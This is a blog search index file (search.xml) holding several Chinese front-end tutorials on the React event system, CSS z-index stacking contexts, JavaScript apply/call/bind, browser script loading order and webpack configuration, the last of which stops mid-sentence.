<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[react事件系统]]></title>
    <url>%2Freact%E4%BA%8B%E4%BB%B6%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[TL;DR react16.8.3 react 事件系统分为事件注册和事件分发两个阶段。 事件注册阶段将大部分事件绑定到 document，在事件分发阶段调用 dispatchEvent进行事件捕获、事件冒泡分发。 事件分发阶段会先根据事件类型调用对应 EventPlugin 进行事件合成，捕获和冒泡阶段会执行的 listener 都会存储到 event._dispatchListeners 前置知识12345678910111213141516171819202122232425262728293031323334// 两变量数组合并function accumulate&lt;T&gt;( current: ?(T | Array&lt;T&gt;), next: T | Array&lt;T&gt;,): T | Array&lt;T&gt; &#123; if (current == null) &#123; return next; &#125; // Both are not empty. Warning: Never call x.concat(y) when you are not // certain that x is an Array (x could be a string with concat method). if (Array.isArray(current)) &#123; return current.concat(next); &#125; if (Array.isArray(next)) &#123; return [current].concat(next); &#125; return [current, next];&#125;// 将数组里面的每个元素作为 cb 的参数,执行 cbfunction forEachAccumulated&lt;T&gt;( arr: ?(Array&lt;T&gt; | T), cb: (elem: T) =&gt; void, scope: ?any,) &#123; if (Array.isArray(arr)) &#123; arr.forEach(cb, scope); &#125; else if (arr) &#123; cb.call(scope, arr); &#125;&#125; 事件注册 根据上图步骤我们逐步分析一下具体细节。 在 document 上绑定事件document 上同一类型的事件只会绑定一次。举个🌰：12345678function Control() &#123; return ( &lt;&gt; &lt;button onClick=&#123;() =&gt; console.log('button1')&#125;&gt;&lt;/button&gt; &lt;button onClick=&#123;() =&gt; console.log('button2')&#125;&gt;&lt;/button&gt; &lt;/&gt; )&#125; 这里我们在两个 button 分别绑定了一次 click 事件, 但是在 document 上只会绑定一次。继续拿 click 事件举例，让我们一起来看下源码：12345678910111213141516171819202122232425262728293031323334353637383940414243// ... 以上省略大量其他事件的条件绑定。dependency 为 react 定义的事件名，与原事件存在一个映射// 比如 topClick 对应的是 click 事件相关东西，后面事件合成再细说// mountAt 即 documenttrapBubbledEvent(dependency, mountAt);// 将该标记为已绑定，后续不会重复绑定isListening[dependency] = true;// ReactDOMEventListener.js 里面的绑定冒泡事件函数export function trapBubbledEvent( topLevelType: DOMTopLevelEventType, element: Document | Element,) &#123; if (!element) &#123; return null; &#125; const dispatch = isInteractiveTopLevelEventType(topLevelType) ? dispatchInteractiveEvent : dispatchEvent; addEventBubbleListener( element, getRawEventName(topLevelType), // 获取 native 事件名 // Check if interactive and wrap in interactiveUpdates dispatch.bind(null, topLevelType), );&#125;// EventListener.js 有两个函数进行事件捕获和事件冒泡的事件绑定export function addEventBubbleListener( element: Document | Element, eventType: string, listener: Function,): void &#123; element.addEventListener(eventType, listener, false);&#125;export function addEventCaptureListener( element: Document | Element, eventType: string, listener: Function,): void &#123; element.addEventListener(eventType, listener, true);&#125; 从上面的代码可以看出在 document 上绑定的其实都是dispatch事件。事件执行的时候就是通过这个函数进行事件分发。 在 target dom 上绑定 noop 函数react 会在目标 dom 上也绑定一个事件，事件对应的监听函数为一个空函数：1function noop() &#123;&#125; 这是为了将 target dom 上的 native event 冒泡到 document，在由 document 进行处理。 为什么不是所有事件都绑定到 document123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// react 中有这么段代码export function listenTo( registrationName: string, mountAt: Document | Element,) &#123; const isListening = getListeningForDocument(mountAt); const dependencies = registrationNameDependencies[registrationName]; for (let i = 0; i &lt; dependencies.length; i++) &#123; const dependency = dependencies[i]; if (!(isListening.hasOwnProperty(dependency) &amp;&amp; isListening[dependency])) &#123; switch (dependency) &#123; case TOP_SCROLL: trapCapturedEvent(TOP_SCROLL, mountAt); break; case TOP_FOCUS: case TOP_BLUR: trapCapturedEvent(TOP_FOCUS, mountAt); trapCapturedEvent(TOP_BLUR, mountAt); // We set the flag for a single dependency later in this function, // but this ensures we mark both as attached rather than just one. isListening[TOP_BLUR] = true; isListening[TOP_FOCUS] = true; break; case TOP_CANCEL: case TOP_CLOSE: if (isEventSupported(getRawEventName(dependency))) &#123; trapCapturedEvent(dependency, mountAt); &#125; break; case TOP_INVALID: case TOP_SUBMIT: case TOP_RESET: // 这里是重点！！！！ // 这些事件会直接绑定到对应的 dom 结构上 // We listen to them on the target DOM elements. // Some of them bubble so we don't want them to fire twice. break; default: // By default, listen on the top level to all non-media events. // Media events don't bubble so adding the listener wouldn't do anything. const isMediaEvent = mediaEventTypes.indexOf(dependency) !== -1; if (!isMediaEvent) &#123; trapBubbledEvent(dependency, mountAt); &#125; break; &#125; isListening[dependency] = true; &#125; &#125;&#125; 事件分发 可能现在已经有很多同学发起疑问了，之前绑定到 component 的 listener 哪去了呢？什么时候被执行呢？稳住，你将会看到了。 查找触发事件的 component前面我们讲过，我们绑定的在 document 上的 listener 其实都是 dispatch 这个分发函数。具体实现如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768// ReactDOMEventListener.jsexport function dispatchEvent( topLevelType: DOMTopLevelEventType, nativeEvent: AnyNativeEvent,) &#123; // ..... // 获取触发事件的 target const nativeEventTarget = getEventTarget(nativeEvent); // 根据 target event 对象查找对应的虚拟 dom 节点，component let targetInst = getClosestInstanceFromNode(nativeEventTarget); //.... // bookKeeping 的对象缓存// &#123;// topLevelType,// nativeEvent,// targetInst,// ancestors: []// &#125;; const bookKeeping = getTopLevelCallbackBookKeeping( topLevelType, nativeEvent, targetInst, ); try &#123; // Event queue being processed in the same cycle allows // `preventDefault`. // 控制函数执行前后的一个状态恢复 // 实质是用于执行 handleTopLevel batchedUpdates(handleTopLevel, bookKeeping); &#125; finally &#123; releaseTopLevelCallbackBookKeeping(bookKeeping); &#125;&#125;function handleTopLevel(bookKeeping) &#123; let targetInst = bookKeeping.targetInst; // Loop through the hierarchy, in case there's any nested components. // It's important that we build the array of ancestors before calling any // event handlers, because event handlers can modify the DOM, leading to // inconsistencies with ReactMount's node cache. See #1105. // 查找祖先 root 的 container，通常为 null let ancestor = targetInst; do &#123; if (!ancestor) &#123; bookKeeping.ancestors.push(ancestor); break; &#125; const root = findRootContainerNode(ancestor); if (!root) &#123; break; &#125; bookKeeping.ancestors.push(ancestor); ancestor = getClosestInstanceFromNode(root); &#125; while (ancestor); for (let i = 0; i &lt; bookKeeping.ancestors.length; i++) &#123; targetInst = bookKeeping.ancestors[i]; runExtractedEventsInBatch( bookKeeping.topLevelType, targetInst, bookKeeping.nativeEvent, getEventTarget(bookKeeping.nativeEvent), ); &#125;&#125; 上面代码的 runExtractedEventsInBatch 函数，就是我们即将要分析生成合成事件的过程。 生成合成事件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// EventPluginHub.jsexport function runExtractedEventsInBatch( topLevelType: TopLevelType, targetInst: null | Fiber, nativeEvent: AnyNativeEvent, nativeEventTarget: EventTarget,) &#123; // 生成合成事件，为数组类型，可能不止一个 const events = extractEvents( topLevelType, targetInst, nativeEvent, nativeEventTarget, ); // 运行合成事件，这个我们后面再分析 runEventsInBatch(events);&#125;function extractEvents( topLevelType: TopLevelType, targetInst: null | Fiber, nativeEvent: AnyNativeEvent, nativeEventTarget: EventTarget,): Array&lt;ReactSyntheticEvent&gt; | ReactSyntheticEvent | null &#123; let events = null; // EventPluginHub在初始化的时候，注入了七个plugin // 使用这些插件分别处理不同的事件 for (let i = 0; i &lt; plugins.length; i++) &#123; // Not every plugin in the ordering may be loaded at runtime. const possiblePlugin: PluginModule&lt;AnyNativeEvent&gt; = plugins[i]; if (possiblePlugin) &#123; // 重点，每个 plugin 都必须有 extractEvents 方法 // 用于从对应 plugin 的事件池中取出实例 // 换句话说就是，通过 extractEvents 生成了单个合成事件 const extractedEvents = possiblePlugin.extractEvents( topLevelType, targetInst, nativeEvent, nativeEventTarget, ); if (extractedEvents) &#123; // 数组合并 events = accumulateInto(events, extractedEvents); &#125; &#125; &#125; return events;&#125; 从上述源码我们可以得知，合成事件是事件插件通过 extractEvents 生成的。我们用 SimpleEventPlugin 来举例说明 extractEvents 的工作原理。假设触发事件为 click 事件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118// SimpleEventPlugin.js extractEvents: function( topLevelType: TopLevelType, targetInst: null | Fiber, nativeEvent: MouseEvent, nativeEventTarget: EventTarget, ): null | ReactSyntheticEvent &#123; const dispatchConfig = topLevelEventsToDispatchConfig[topLevelType]; if (!dispatchConfig) &#123; return null; &#125; let EventConstructor; switch (topLevelType) &#123; case DOMTopLevelEventTypes.TOP_KEY_PRESS: // ........ 省略一堆判断 /* falls through */ case DOMTopLevelEventTypes.TOP_AUX_CLICK: case DOMTopLevelEventTypes.TOP_DOUBLE_CLICK: case DOMTopLevelEventTypes.TOP_MOUSE_DOWN: case DOMTopLevelEventTypes.TOP_MOUSE_MOVE: case DOMTopLevelEventTypes.TOP_MOUSE_UP: EventConstructor = SyntheticMouseEvent; // ......... &#125; // 从上述代码可看出，我们取出 click 事件对应的构造函数 // 然后通过静态方法，从事件池中取出一个事件 const event = EventConstructor.getPooled( dispatchConfig, targetInst, nativeEvent, nativeEventTarget, ); // 事件的初始操作 // 用来绑定事件捕获和事件冒泡过程中涉及的监听函数 accumulateTwoPhaseDispatches(event); return event; &#125;,// EventPropagators.jsexport function accumulateTwoPhaseDispatches(events) &#123; // 将每个 events 事件在 accumulateTwoPhaseDispatchesSingle 上执行 forEachAccumulated(events, accumulateTwoPhaseDispatchesSingle);&#125;function accumulateTwoPhaseDispatchesSingle(event) &#123; if (event &amp;&amp; event.dispatchConfig.phasedRegistrationNames) &#123; // accumulateDirectionalDispatches 后面我们在解析 traverseTwoPhase(event._targetInst, accumulateDirectionalDispatches, event); &#125;&#125;// ReactTreeTraversal.js// 查找目标节点父节点// fn 为上面的 accumulateDirectionalDispatchesexport function traverseTwoPhase(inst, fn, arg) &#123; const path = []; while (inst) &#123; path.push(inst); inst = getParent(inst); &#125; let i; // 生成捕获流程 for (i = path.length; i-- &gt; 0; ) &#123; fn(path[i], 'captured', arg); &#125; // 生成冒泡流程 for (i = 0; i &lt; path.length; i++) &#123; fn(path[i], 'bubbled', arg); &#125;&#125;// EventPropagators.js// 到这里我们终于看到 _dispatchListeners 了// _dispatchListener 按捕获和冒泡的顺序存储了对应的 listenerfunction accumulateDirectionalDispatches(inst, phase, event) &#123; // 查找 component 上面的 listener const listener = listenerAtPhase(inst, event, phase); if (listener) &#123; event._dispatchListeners = accumulateInto( event._dispatchListeners, listener, ); // 存储实例 event._dispatchInstances = accumulateInto(event._dispatchInstances, inst); &#125;&#125;// 获取 dom 的listenerfunction listenerAtPhase(inst, event, propagationPhase: PropagationPhases) &#123; const registrationName = event.dispatchConfig.phasedRegistrationNames[propagationPhase]; return getListener(inst, registrationName);&#125;// EventPluginHub.jsexport function getListener(inst: Fiber, registrationName: string) &#123; let listener; // TODO: shouldPreventMouseEvent is DOM-specific and definitely should not // live here; needs to be moved to a better place soon const stateNode = inst.stateNode; if (!stateNode) &#123; // Work in progress (ex: onload events in incremental mode). return null; &#125; // 查找对应 component 的props const props = getFiberCurrentPropsFromNode(stateNode); if (!props) &#123; // Work in progress. return null; &#125; // 从 props 中取出 listener // 至此，我们已经初始化完了合成事件 listener = props[registrationName]; if (shouldPreventMouseEvent(registrationName, inst.type, props)) &#123; return null; &#125; return listener;&#125; 执行合成事件接着我们上文 runEventsInBatch 函数，执行合成事件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091// EventPluginHub.jsexport function runEventsInBatch( events: Array&lt;ReactSyntheticEvent&gt; | ReactSyntheticEvent | null,) &#123; // 和当前事件队列合并 if (events !== null) &#123; eventQueue = accumulateInto(eventQueue, events); &#125; // Set `eventQueue` to null before processing it so that we can tell if more // events get enqueued while processing. const processingEventQueue = eventQueue; eventQueue = null; if (!processingEventQueue) &#123; return; &#125; // 执行事件队列中的事件 forEachAccumulated(processingEventQueue, executeDispatchesAndReleaseTopLevel); // This would be a good time to rethrow if any of the event handlers threw. rethrowCaughtError();&#125;// 忍住，快摸到瓜了const executeDispatchesAndReleaseTopLevel = function(e) &#123; return executeDispatchesAndRelease(e);&#125;;const executeDispatchesAndRelease = function(event: ReactSyntheticEvent) &#123; if (event) &#123; // 按顺序执行事件 executeDispatchesInOrder(event); // 执行完后释放事件实例，放回事件对象池 if (!event.isPersistent()) &#123; event.constructor.release(event); &#125; &#125;&#125;;// EventPluginUtils.js// 最后一步了export function executeDispatchesInOrder(event) &#123; // 取出之前我们存入 dispatchListeners 的listener 执行 const dispatchListeners = event._dispatchListeners; const dispatchInstances = event._dispatchInstances; if (__DEV__) &#123; validateEventDispatches(event); &#125; if (Array.isArray(dispatchListeners)) &#123; for (let i = 0; i &lt; dispatchListeners.length; i++) &#123; if (event.isPropagationStopped()) &#123; break; &#125; // Listeners and Instances are two parallel arrays that are always in sync. executeDispatch(event, dispatchListeners[i], dispatchInstances[i]); &#125; &#125; else if (dispatchListeners) &#123; executeDispatch(event, dispatchListeners, dispatchInstances); &#125; event._dispatchListeners = null; event._dispatchInstances = null;&#125;function executeDispatch(event, listener, inst) &#123; const type = event.type || 'unknown-event'; event.currentTarget = getNodeFromInstance(inst); invokeGuardedCallbackAndCatchFirstError(type, listener, undefined, event); event.currentTarget = null;&#125;// invokeGuardedCallbackImpl.js// 最终通过这个函数执行我们的 listener// func 即我们的 listenerlet invokeGuardedCallbackImpl = function&lt;A, B, C, D, E, F, Context&gt;( name: string | null, func: (a: A, b: B, c: C, d: D, e: E, f: F) =&gt; mixed, context: Context, a: A, b: B, c: C, d: D, e: E, f: F,) &#123; const funcArgs = Array.prototype.slice.call(arguments, 3); try &#123; func.apply(context, funcArgs); &#125; catch (error) &#123; this.onError(error); &#125;&#125;; 完毕！ 参考美女黄琼大神，建议阅读揭秘React形成合成事件的过程一看就晕的React事件机制 感谢阅读]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>事件系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解z-index]]></title>
    <url>%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3z-index%2F</url>
    <content type="text"><![CDATA[z-index 简单呀，想显示在上面给个大点的整数不久行了吗❓❓❓ 我们想的还是简单了点，这就好像写了一段能跑的代码，但是不知道它是怎么跑起来的，这就是新手和大佬的差距。要学的还很多，且勿骄勿躁，与君共勉！ z-index 简单来说就是能够控制层叠上下文中元素在 z 轴前后位置，所以我们应该先理解什么是层叠上下文才能更好理解 z-index 工作原理，以及使用 z-index 的正确姿势。 嗯，好！带着这个问题往下看：什么是层叠上下文？ 此处你可能会忍不住一声长叹，又是一个新概念呀～ 为什么要定义概念呢？因为使用同一概念易于知识的交流与传播。 但有一个缺陷：当不理解这个概念的时候，解析起来的复杂的，解析的不好时候，他人理解起来更是困难，甚至误解。得看解析的人的水准，所以若下文有缺陷还是很希望有大佬来斧正的！ 层叠上下文 html 文档有一个三维的概念，如上图所示的 z 轴。假设整个 html 文档没有新建的层叠上下文，那么就只有一个根层叠上下文，可以想象成上图 x 轴和 y 轴交叉形成的紫色平面。如果有新创建层叠上下文，那么会根据层叠上下文的顺序，形成层叠空间，如上图 Stack element1 和 Stack element2。 那么层叠上下文之间又有什么关系呢？上文提及的层叠上下文的顺序又是怎么样的一个顺序呢？ 层叠上下文之间的关系 层叠上下文比根层叠上下文（普通元素）优先级高。 层叠上下文可以嵌套，在层叠上下文中可以新建层叠上下文。 层叠上下文兄弟之间彼此独立，当涉及兄弟层叠上下文比较时，比较父元素之间的优先级，子元素继承父元素的优先级；若父元素优先级相同，则遵循后来据上的原则。 层叠上下文自成体系，可以理解成层叠上下文中的元素的层叠关系只遵循层叠上下文的顺序规则，不受其他层叠上下文极其其他因素的影响。 这里图解一下第三点 层叠上下文的层叠顺序 图片右上角 Stacking Order 即是层叠顺序的意思，总共 7 层，（呃，小学生也数的出来）至于各个层级之间那几个英文单词应该不成问题吧～应该～应… 除了第 1 层 (background/Borders) 和第 5 层 (Inline Boxes)，其他层级相信也挺好理解的，我们重点分析第 1、5层： Background/Borders：背景边框在最底层，意指位处层叠上下文最底层的元素的背景和边，不管你设置子元素的 z-index 的值为负多少，始终在这个层叠上下文中。 Inline Boxes：行内元素他兄弟 Inline-block 其实吧也是属于这一层的。 当元素处于相同的层级时，比如 z-index 都是 1 ，那么遵循后来居上的原则。 层叠上下文的创建 层叠上下文的创建分为三种类型，原本就存在的根层叠上下文、定位元素创建的层叠上下文、css3新属性创建的层叠上下文。下面我们来分析一下： 根层叠上下文也就是原始 html 的文档，也称为普通元素。层叠上下文的创建总得有个参照物吧？就像绝对定位类似，没有给它做参照的，就以浏览器窗口作为参照定位一个道理。 定位元素与层叠上下文 当 position 的值为 relative/absolute 时，只要 z-index 不是默认值 auto 创建上下文。 当 postion 的值为 fixed 时，默认创建上下文。 注意：这里浏览器实现实现有差异，这里只考虑 chrome，其他浏览器请自行做测试。 请看下面的🌰： 可以看到动漫图片跑到 box 后面去了，如果我们把 box 的 z-index 改为 0: 动漫图片就跑上来了。在来试试 position: fixed: 可以看到即使 z-index 为 auto 一样可以形成层叠上下文，使 z-index 为负值的 img 不会跑到 box 后面去。 css3新属性与层叠式上下文css3 出现的一些新属性对过去很多规则发生了挑战。而对层叠上下文又影响的包括以下属性： z-index 值不为 auto 的 flex 项（父元素为 display: flex | inline-flex); 元素的 opacity 值不是 1； 元素的 transform 值不是 none; 元素的 mix-blend-mode 值不是 normal; 元素的 filter 值不是 none; 元素的 isolation 是 isolate; will-change 指定的属性值为上面任意一个； 元素 -webkit-overflow-scrolling 设为 touch。 display: flex|inline-flex 与层叠上下文 可以看到 z-index: 0 不起作用，图片跑下面去了 没有定位元素，box 的 z-index:0 起作用，图片不能跑到 box 下面。 opacity 与层叠上下文 可以看到 opacity 使 z-index 起作用，形成了层叠上下文，图片不能跑到 box 下面。 剩下的几个属性，作为练手，请读者亲自试试，这里就不赘述了～]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>z-index</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[理解apply,call,bind]]></title>
    <url>%2F%E7%90%86%E8%A7%A3apply%2Ccall%2Cbind%2F</url>
    <content type="text"><![CDATA[之前对 js 的 apply、call、bind 方法零零散散有过一些了解，知道它们可以改变函数运行时的 this。今天来深入理解一番。 其实很多人心想不久是绑定 this 嘛，有什么的。 好，那么这句代码何解？ 1Function.apply.bind(Math.max, null); 知道呀，不就是 xxxx 嘛 那么这句呢？ 1Function.bind.apply(fn, arguments) 知道的就可以直接关闭页面了，还不了解的请往下看 首先什么是 this 函数被调用时，会创建一个执行上下文。执行上下文中会包含函数的参数、调用方法等信息。this 就是其中的一个属性。相当于一个指针，至于指向什么，完全取决于函数在哪里被调用。 好像有点晕，我们通过代码来分析一下： 1234567891011121314151617181920212223242526272829303132333435const obj = &#123; index: 1, func: function() &#123; console.log(this.index); &#125;&#125;/** 输出什么？* 不用想了，没什么陷阱* 1*/obj.func(); const funcCp = obj.func;/** 输出什么？* 也没什么难度* undefined * this 指向全局了嘛*/funcCp();function bar(fun) &#123; fun();&#125;/** 输出什么？* 很多人可能曾经就犯过这个错误了，以为是 1，其实还是* undefined * obj.func 对 fun 进行了隐式赋值*/bar(obj.func); apply apply 调用一个函数，第一个参数指定运行时 this，第二参数接受一个包含多个参数的数组。（这是与 call 方法的区别) 12345678910111213141516function func(x, y) &#123; if (typeof x === 'number') &#123; console.log(this.index + x); &#125; else &#123; console.log(this.index); &#125;&#125;const obj = &#123; index: 1,&#125;func.apply(obj); // 1func.apply(obj, 2); // 报错，第二个参数（如果有）必须为数组func.apply(obj, [2]); // 3func.apply(obj, [2], 3); // 3，后面的参数将会忽略 apply 经常用于“展开”数组： 1Math.max.apply(null, [1, 2, 3]); // 3 此种做法 es6 称为解构: 1Math.max(...[1, 2, 3]); // 3 call call 调用一个函数，第一个参数指定运行时的 this，其余参数指定参数列表。 1234567891011121314function func(x, y) &#123; if (typeof x === 'number') &#123; console.log(this.index + x); &#125; else &#123; console.log(this.index); &#125;&#125;const obj = &#123; index: 1,&#125;func.call(obj); // 1func.call(obj, 2); //3 bind bind 创建一个新的函数，第一个参数指定运行时的 this，其余参数置于实参之前。可以理解为对 apply 方法的封装调用。 1234567891011121314151617function func(x, y) &#123; if (typeof x === 'number' &amp;&amp; typeof y === 'number' ) &#123; console.log(this.index + x + y); &#125; else &#123; console.log(this.index); &#125;&#125;const obj = &#123; index: 1,&#125;const newFunc1 = func.bind(obj);newFunc1(); // 1const newFunc2 = func.bind(obj, 2);newFunc2(3); // 6 bind 经常用来做柯里化： 123456function func(x, y) &#123; console.log(`$&#123;x&#125; ------ $&#123;y&#125;`);&#125;const k = func.bind(null, 1);k(2); // 1 ------ 2 进化 那么下面语句将会输出什么呢？ 123456789101112131415161718192021222324252627const fn = function(x) &#123; console.log(2 + x);&#125;// 聪明的你可能已经想到了，答案为：4// apply 指定 Function.call 的执行上下文为 fn，并传入参数 2。// 根据 call 语法规则，call 调用 fn，并传入参数 2Function.call.apply(fn, [null, 2]);// 报错，记住 apply 的第二个参数必须为 数组Function.apply.apply(fn, [null, 2]); // 通过, 输出：4Function.apply.apply(fn, [null, [2]]); /*+++++++++++++++++++++++++++++++++++++++++++++++++++++*/const foo = Function.apply.bind(fn, null, [2]);// 注意，bind 的作用时生成一个新的函数// 给 Function.apply 绑定一个 fn 的执行上下文，并将参数 2 传入 fnfoo(); // 4/*+++++++++++++++++++++++++++++++++++++++++++++++++++++*/const bar = Function.bind.apply(fn, [fn, 2]);// 注意，bind 的作用时生成一个新的函数bar(); // 4]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>apply</tag>
        <tag>call</tag>
        <tag>bind</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浏览器加载文件及其解析顺序]]></title>
    <url>%2F%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%A0%E8%BD%BD%E6%96%87%E4%BB%B6%E5%8F%8A%E5%85%B6%E8%A7%A3%E6%9E%90%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[浏览器加载文件及其解析顺序 用户输入网址（假设是个 HTML 页面，并且是首次访问），浏览器向服务器发出请求 下载 HTML，并解析执行，逐步构建 DOM 树 如果发现有外部 css 文件，进行异步加载，不会阻塞 HTML 的解析 注：如果使用 HTTP/2 推送技术，可以提前进行资源的推送 若果发现 HTML 文档中的图片资源，进行加载，也不会阻塞 HTML 解析，这里分为两种情况； 使用 HTTP/1.x 协议，资源是串型加载的，所以浏览通过开启多个连接进行并行加载，但是开启多个连接的数据量有限制4-8个左右，如果一个页面图片多（还包含其他资源）那么会阻塞图片的下载 使用 HTTP/2 全部图片进行异步加载不会解析执行 如果遇到 script 节点，情况比较复杂，我们分情况详细讨论 普通 script 因为 js 有可能会修改 DOM。比如说 document.write，所以浏览器遇到 js 文件时，会停止后面的 HTML 解析，等待 js 执行完后，再去解析后面 HTML 文档 如果此时有未加载完的样式文件，浏览器不会构建渲染树，屏幕会一直显示空白。HTML 和 CSS 都是阻塞渲染资源，应该尽可能早地下载 如果已经加载完样式文件，则会构建渲染树，先渲染已解析完的 DOM（如果有的话） 为了减缓渲染被阻塞的情况，现代浏览器都是用了猜测预加载（specculative loading)，当渲染被阻塞的时候，它会做以下一些事： 轻量级的 HTML （或 CSS）扫描器（scanner）继续在文档中扫描 查找哪些将来可能能够用到的资源文件的 URL 在渲染器使用它们之间将其下载下来 也可以利用 http/2 推送功能将资源先从服务器推送下来 这也就解析为了什么 css 要放在页面顶部，而 js 放在底部 defer script 不阻止解析 HTML，并行下载 js 即使下载完文件仍然继续解析 HTML 按照页面中出现的顺序，在其他同步脚本执行后，DOMContendLoaded 事件前依次执行 defer 文件 async script 不阻止解析 HTML，并行下载 js 文件 当脚本下载完毕后，立即解析执行，async 的执行顺序不确定，执行阶段也不确定 因为顺序无关，所以很适合像 Google Analytics 这样的无依赖脚本 因为 js 执行线程和 GUI 渲染线程互斥，所以在 js 执行的时候都会冻结 GUI 渲染线程，GUI 更新会被保存到一个队列中等到引擎线程空闲时立即被执行。 因为浏览器不知道 js 执行会不会改变 dom，所以即使是 async 的执行也会阻塞 dom 解析 其他 如果 script 无 src 属性，则 defer，async 会被忽略 动态添加的 script 标签隐含 async 属性 加快 HTML 页面加载速度策略 压缩压缩压缩，html，css，js，图片压缩 升级升级升级，升级 HTTP/2 使用 CDN]]></content>
      <categories>
        <category>文件加载顺序</category>
      </categories>
      <tags>
        <tag>文件加载顺序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webpack之基础配置]]></title>
    <url>%2Fwebpack%E4%B9%8B%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[随着 web 应用逐渐复杂、前端技术的日新月异，前端代码的可扩展性、可维护性不断被提上议程。前端代码工程化的问题急需被解决，从模块化到构建工具，一代代发展，webpack 顺势而生，力压群雄。 在回答为什么需要解决前端工程化的问题前，先问问自己几个问题： 当使用 es6 开发前端应用时，如何将其编译成 es5 在低端浏览器运行？ 如何把多模块合并为一个文件？ 如何进行文件压缩？ 如何提取多个页面的公共代码？ 如何实现懒加载？ 多人合作开发，如何进行代码校验，尽量保持代码风格的统一？ 如何自动实现代码发布？ …. 你可能会说，以上可以利用现有库或者自行开发一些工具函数实现呀！ 不错，是可以，单单一个大点的项目手动实现的工作量就已经很惊人了，如果有多个项目呢？而构建工具，例如：webpack，可以通过简单的配置自动解决上述问题，减少大量重复的劳作时间，提高开发效率。 由于 webpack 是目前最好的构建工具，有良好的生态链和维护团队。下面我们重点来深入理解下 webpack。进而更好的应用于我们的产品当用，提高我们的开发效率和产品性能。 我们先来介绍 webpack 的几个核心概念，让你内心对 webpack 有个整体的认知，方便后面对 webpack 的学习： Entry: 入口，webpack 执行构建的入口。 Module: 模块，webpack 视一切为模块，每一个文件为一个模块。webpack 会从 Entry 入口文件递归查找所有依赖文件。 Chunk: 代码块，一个 Chunk 由多个模块组成，用于合并和分割代码。 Loader: 模块转换器，用于把模块内容转换成新的内容，例如：scss，转换成 css。 Plugin: 插件，用于在 webpack 构建流程中的特定时机注入扩展逻辑来改变构建或做其他事情。 Output: 输出结果，webpack 完成构建后，将一系列文件输出。 webpack 启动后会从 Entry 开始递归解析 Entry 所依赖的所有 Module。每找到一个 Module，就会根据配置的 Loader 去找出对应的转换规则，对 Module 转换后，再解析出当前 Module 所依赖的 Module。这些模块会以 Entry 为单位进行分组，一个 Entry 和其所依赖的 Module 被分到一个组，也就是一个 Chunk。最后 webpack 会把所有 Chunk 转换成文件输出。在整个处理流程中，webpack 会在恰当的时机执行 Plugin 定义的逻辑。 Entry entry 是 webpack 构建入口，可以理解为构建起点。webpack 将从 entry 递归遍历所有依赖的 module。 contextwebapck 查找相对路径的文件会以 context 为根目录，默认值为执行 webpack 的当前工作目录。可以通过以下方式设置： 123module.exports = &#123; context: path.resolve(__dirname, 'otherWorkPath'),&#125; 注：context 必须为绝对路径，除了配置文件还可以通过 webpack —context 设置。 先在这里介绍 context，是因为 entry 路径和其他依赖模块的路径可能采用相对于 context 的路径来描述。 entry 用法123456789101112//用法1(单入口）：entry: string|Array&lt;string&gt;const config = &#123; entry: './path/to/my/entry/file.js'&#125;//用法2（对象语法）：entry: &#123;[entryChunkName: string]: string|Array&lt;string&gt;&#125;const config = &#123; entry: &#123; app: './src/app.js', vendors: './src/vendors.js', &#125;&#125; 这只是一个简单的示范，后续文章会根据实例进一步详细说明。 Chunk 名称webpack 生成的 Chunk 名称与 Entry 的配置有关： entry 是一个 string 或 array，那么生成的 Chunk 名称为 main。 entry 是一个 object，那么生成的 Chunk 名称为 object 键值对应的键名。 动态 entry如果有多个页面需要配置 entry，并且可能还会增加新的页面，entry 可能受其他因素影响不能写成静态值，需要动态配置，如下： 1234567891011121314151617// 同步entry: () =&gt; &#123; return &#123; pageOne: './pageOne/index.js', pageTwo: './pageTwo/index.js', &#125;&#125;// 异步entry: () =&gt; &#123; return new Promise((resolve) =&gt; &#123; resolve(&#123; pageOne: './pageOne/index.js', pageTwo: './pageTwo/index.js', &#125;) &#125;)&#125; Output 配置 output 选项控制 webpack 如何向硬盘写入文件，是一个 object，里面包含一系列配置选项。 filename配置输出文件名称：string，当只有一个文件时可以成静态文件名： 1filename: &apos;bundle.js&apos; 当有多个 Chunk 时，需要借助模版和变量。前面说到 webpack 会为每个 Chunk 生成一个文件名，可以这样用： 1filname: &apos;[name].js&apos; [name] 代表用内置变量 name 去代替 [name]，类似于 es6 的模版字符串。除了 name 还包括： id： Chunk 的唯一标识，从 0 开始。 name: Chunk 名称。 hash: Chunk 唯一标识 的 hash 值。 chunkhash: Chunk 内容 hash 值。 其中 hash 和 chunkhash 值的长度是可指定的，[chunkhash: 8] 代表取 8 位的 chunkhash 值，默认是 20。 注意 ExtractTextWebpackPlugin 插件是使用 contenthash 来代表哈希值而不是 chunkhash， 原因在于 ExtractTextWebpackPlugin 提取出来的内容是代码内容本身而不是由一组模块组成的 Chunk。 chunkFilenameoutput.chunkFilename 用于配制无入口的 Chunk 在输出时的文件名称。通常配合 CommonsChunkPlugin(用于提取公共代码的插件) 和动态加载使用。配置方式和 output.filename 一样。 注意：在 webpack4.0 commonsChunkPlugin 被移除，用 optimization.splitChunks 和 optimization.runtimeChunk 取代。 pathoutput.path 配置构建输出文件的位置，必须是 string 类型的绝对路径。 1path: path.resolve(__dirname, &apos;dist&apos;); publicPathoutput.publicPath 默认值为 